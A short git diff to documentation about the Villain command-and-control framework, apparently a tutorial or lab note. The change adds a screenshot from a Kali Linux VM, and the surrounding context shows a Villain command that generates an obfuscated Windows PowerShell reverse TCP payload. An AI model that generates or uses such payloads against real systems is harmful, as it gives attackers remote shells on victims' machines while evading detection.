@@ -35,4 +35,5 @@ The Villain Framework is an open-source command-and-control (C2) framework desig
   ```zsh
   generate os=windows payload=windows/reverse_tcp/powershell lhost=eth0 obfuscate
   ```
-  
+<img width="1047" height="396" alt="VirtualBox_kali-linux-2025 2-virtualbox-amd64_19_08_2025_05_27_43" src="https://github.com/user-attachments/assets/df54b8f1-a858-46c3-832c-93b86aaed3aa" />
+
